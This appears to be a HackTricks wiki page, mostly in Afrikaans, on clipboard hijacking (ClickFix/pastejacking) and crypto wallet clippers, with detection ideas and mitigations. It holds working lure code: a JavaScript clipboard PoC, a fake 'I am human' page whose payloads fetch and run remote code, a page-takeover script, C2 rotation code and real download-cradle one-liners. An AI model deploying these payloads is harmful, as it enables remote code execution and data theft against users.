# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – old but still valid advice

## Oorsig

Clipboard hijacking – ook bekend as *pastejacking* – misbruik die feit dat users gereeld commands copy-and-paste sonder om dit te inspekteer. ’n Kwaadwillige web page (of enige JavaScript-capable konteks soos ’n Electron of Desktop application) plaas programmaties attacker-controlled teks in die system clipboard. Victims word aangemoedig, gewoonlik deur sorgvuldig saamgestelde social-engineering instructions, om **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) te druk, of ’n terminal oop te maak en die clipboard content te *paste*, wat onmiddellik arbitrary commands uitvoer.

Omdat **geen file afgelaai word en geen attachment oopgemaak word nie**, omseil die technique die meeste e-mail en web-content security controls wat attachments, macros of direct command execution monitor. Die attack is dus gewild in phishing campaigns wat commodity malware families soos NetSupport RAT, Latrodectus loader of Lumma Stealer aflewer.

## Wallet-address replacement clippers

’n Ander **clipboard hijacking** variant paste glad nie commands nie: dit wag totdat die victim ’n **cryptocurrency wallet address** copy, en vervang dit dan stilweg met ’n attacker-controlled een net voor paste. Dit is veral effektief teen lang wallet formats omdat users dikwels net die eerste/laatste karakters verifieer.

Algemene real-world kenmerke:
- **Thin loader + nested payload**: die sigbare app/exe lyk soos ’n legit trading of "profit" tool, terwyl die regte clipper dieper in die bundle versteek is (byvoorbeeld ’n .NET loader wat ’n nested Rust payload launch).
- **Regex-driven replacement**: die malware match strings soos `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, of selfs generiese **44-karakter Solana-like** strings en herskryf dit na attacker wallets.
- **Wallet rotation at scale**: moderne Windows samples kan **duisende** replacement wallets per currency embed in plaas van een statiese address, wat wallet reputation burn ná elke theft verminder.

### Windows clipper flow

’n Algemene implementation is ’n hidden window wat met **`AddClipboardFormatListener`** geregistreer word. By elke clipboard update roep die malware tipies:
- **`OpenClipboard`** → access die current clipboard data.
- **`GetClipboardData`** → lees text.
- **`EmptyClipboard`** + **`SetClipboardData`** → vervang die wallet string met die attacker value.

Minimal hunting regexes wat dikwels in clippers gesien word:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Gebruiker-vlak-persistensie is genoeg vir impak. Een waargenome patroon is:
- Kopieer payload na **`%APPDATA%\silke\silke.exe`**
- Skep ’n **Startup-folder LNK** onder `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Opsporingsidees:
- Prosesse wat clipboard APIs aanhoudend aanroep terwyl hulle ook onder `%APPDATA%` en die gebruiker se **Startup**-folder skryf.
- Nuwe LNK/executable-skepping gevolg deur wallet-address clipboard-herskrywings.
- Archives of fake-software bundles wat baie ongebruikte lêers plus ’n klein launcher bevat wat ’n geneste binary begin.

### macOS sosiaal-ingenieerde quarantine-verwydering + LaunchAgent-persistensie

Op macOS stuur sommige campaigns ’n **`unlocker.command`** helper en gee die slagoffer opdrag om regs te klik → **Open** as Gatekeeper sê die app is beskadig of van ’n onbekende ontwikkelaar af kom. Die script verwyder eenvoudig quarantine en begin die nabygeleë `.app`:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.

After execution, the clipper can persist as the current user by writing:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent with `RunAtLoad` and `KeepAlive`

A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
1. Kill the active clipper process.
2. Unload/delete the LaunchAgent plist.
3. Delete `~/launch.sh` and the copied payload.

### Delivery note: fake reputation as a force multiplier

For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.

## Forced copy buttons and hidden payloads (macOS one-liners)

Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ouerer veldtogte het `document.execCommand('copy')` gebruik; nuweres maak staat op die asinchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Die ClickFix / ClearFake Vloei

1. Gebruiker besoek ’n tipegekaapte of gekompromitteerde webwerf (bv. `docusign.sa[.]com`)
2. Ingespuite **ClearFake** JavaScript roep `unsecuredCopyToClipboard()` helper aan wat stilweg ’n Base64-gekodeerde PowerShell een-lyn opdrag in die klembord stoor.
3. HTML-instruksies sê vir die slagoffer om: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` voer uit, laai ’n argief af wat ’n legitieme uitvoerbare lêer plus ’n kwaadwillige DLL bevat (klassieke DLL sideloading).
5. Die laaier dekripteer addisionele stadiums, spuit shellcode in en installeer persistence (bv. scheduled task) – en loop uiteindelik NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) soek sy gids vir `msvcp140.dll`.
* Die kwaadaardige DLL los APIs dinamies op met **GetProcAddress**, laai twee binaries af (`data_3.bin`, `data_4.bin`) via **curl.exe**, dekripteer hulle met ’n rolling XOR-sleutel `"https://google.com/"`, injecteer die finale shellcode en unzip **client32.exe** (NetSupport RAT) na `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Laai `la.txt` af met **curl.exe**
2. Voer die JScript-aflaaier binne **cscript.exe** uit
3. Haal ’n MSI-payload af → laat `libcef.dll` val langs ’n ondertekende toepassing → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Die **mshta**-oproep begin ’n versteekte PowerShell-skrip wat `PartyContinued.exe` ophaal, `Boat.pst` (CAB) uithaal, `AutoIt3.exe` heropbou deur middel van `extrac32` & lêer-konkatenasie en uiteindelik ’n `.a3x`-skrip laat loop wat blaaier-bewyse na `sumeriavgv.digital` uitlek.

## ClickFix: Klembord → PowerShell → JS eval → Startup LNK met roterende C2 (PureHVNC)

Sommige ClickFix-veldtogte slaan lêer-aflaaie heeltemal oor en gee slagoffers opdrag om ’n eenlyner te plak wat JavaScript via WSH haal en uitvoer, dit te laat voortbestaan, en C2 daagliks te roteer. Voorbeeld waargenome ketting:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sleutelkenmerke
- Obfuscated URL word by looptyd omgekeer om toevallige inspeksie te verydel.
- JavaScript handhaaf homself via a Startup LNK (WScript/CScript), en kies die C2 volgens die huidige dag – wat vinnige domeinrotasie moontlik maak.

Minimale JS-fragment wat gebruik word om C2's volgens datum te roteer:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Volgende stadium ontplooi gewoonlik ’n loader wat volharding vestig en ’n RAT trek (bv. PureHVNC), dikwels met TLS-pin-toepassing na ’n hardcoded sertifikaat en verkeer in stukke verdeel.

Opsporingsidees spesifiek vir hierdie variant
- Prosesboom: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (of `cscript.exe`).
- Opstart-artefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wat WScript/CScript aanroep met ’n JS-pad onder `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU en command-line telemetry wat `.split('').reverse().join('')` of `eval(a.responseText)` bevat.
- Herhaalde `powershell -NoProfile -NonInteractive -Command -` met ’n groot stdin-payload om lang scripts te voer sonder lang command lines.
- Scheduled Tasks wat daarna LOLBins uitvoer soos `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` onder ’n updater-agtige task/pad (bv. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daagliks-roteerende C2-hostname en URL’s met `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` patroon.
- Korrelleer clipboard write events gevolg deur Win+R paste en dan onmiddellik `powershell.exe`-uitvoering.


Blue-teams kan clipboard-, proses-skepping- en registry-telemetrie kombineer om pastejacking-misbruik vas te pen:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` hou ’n geskiedenis van **Win + R**-opdragte – soek na ongewone Base64 / obfuscated inskrywings.
* Security Event ID **4688** (Process Creation) waar `ParentImage` == `explorer.exe` en `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** vir liaskeppings onder `%LocalAppData%\Microsoft\Windows\WinX\` of tydelike vouers net voor die verdagte 4688-event.
* EDR clipboard sensors (indien teenwoordig) – korreleer `Clipboard Write` onmiddellik gevolg deur ’n nuwe PowerShell-proses.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Onlangse veldtogte produseer op groot skaal valse CDN/browser-verifikasiebladsye ("Just a moment…", IUAM-style) wat gebruikers dwing om OS-spesifieke opdragte vanaf hul clipboard in inheemse consoles te kopieer. Dit skuif uitvoering uit die browser sandbox en werk oor Windows en macOS.

Sleutelkenmerke van die builder-gegenereerde bladsye
- OS-detectie via `navigator.userAgent` om payloads aan te pas (Windows PowerShell/CMD vs. macOS Terminal). Opsionele decoys/no-ops vir nie-ondersteunde OS om die illusie te behou.
- Outomatiese clipboard-copy op goedaardige UI-aksies (checkbox/Copy) terwyl die sigbare teks van die clipboard-inhoud kan verskil.
- Mobiele blokkering en ’n popover met stap-vir-stap-instruksies: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opsionele obfuscation en enkel-lêer injector om ’n gekompromitteerde webwerf se DOM te oorskryf met ’n Tailwind-gestileerde verifikasie-UI (geen nuwe domain registration nodig nie).

Voorbeeld: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS-volharding van die aanvanklike run
- Gebruik `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` sodat uitvoering voortgaan nadat die terminaal sluit, wat sigbare artefakte verminder.

In-place page takeover op gekompromitteerde webwerwe
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Pages that bind Clipboard API to verification widgets; mismatch between displayed text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace in suspicious contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` kort ná ’n blaaier-interaksie; batch/MSI installers uitgevoer vanaf `%TEMP%`.
- macOS endpoint: Terminal/iTerm wat `bash`/`curl`/`base64 -d` met `nohup` naby blaaiergebeure spawn; agtergrondtake wat terminal-toemaak oorleef.
- Korrelleer `RunMRU` Win+R-geskiedenis en clipboard writes met daaropvolgende console process creation.

Sien ook vir ondersteunende tegnieke

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake bly WordPress-webwerwe compromiseer en inject loader JavaScript wat eksterne hosts (Cloudflare Workers, GitHub/jsDelivr) en selfs blockchain “etherhiding” calls (bv. POSTs na Binance Smart Chain API endpoints soos `bsc-testnet.drpc[.]org`) aaneenskakel om huidige lure logic te haal. Onlangse overlays gebruik swaar fake CAPTCHAs wat gebruikers opdrag gee om ’n een-lyn te copy/paste (T1204.004) in plaas daarvan om enigiets af te laai.
- Initial execution word toenemend gedelegeer aan signed script hosts/LOLBAS. Chains in Januarie 2026 het vroeëre `mshta` gebruik vervang met die ingeboude `SyncAppvPublishingServer.vbs` wat via `WScript.exe` uitgevoer word, met PowerShell-like arguments met aliases/wildcards om remote content te fetch:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` is geteken en word normaalweg deur App-V gebruik; saam met `WScript.exe` en ongewone arguments (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) word dit ’n hoë-sein LOLBAS-fase vir ClearFake.
- Februarie 2026 vals CAPTCHA payloads het teruggeskuif na suiwer PowerShell download cradles. Twee lewendige voorbeelde:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Eerste chain is ’n in-memory `iex(irm ...)` grabber; die tweede stage via `WinHttp.WinHttpRequest.5.1`, skryf ’n tydelike `.ps1`, en begin dan met `-ep bypass` in ’n hidden window.

Detectie/jag-wenke vir hierdie variante
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` of PowerShell cradles onmiddellik ná clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, of raw IP `iex(irm ...)` patterns.
- Network: outbound na CDN worker hosts of blockchain RPC endpoints vanaf script hosts/PowerShell kort ná web browsing.
- File/registry: tydelike `.ps1` creation onder `%TEMP%` plus RunMRU entries wat hierdie one-liners bevat; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing met external URLs of obfuscated alias strings.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) of vereis user gesture.
2. Security awareness – leer users om sensitiewe commands te *tik* of hulle eers in ’n text editor te paste.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control om arbitrary one-liners te block.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** abuse dikwels dieselfde ClickFix approach nadat users na ’n malicious server gelok is:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
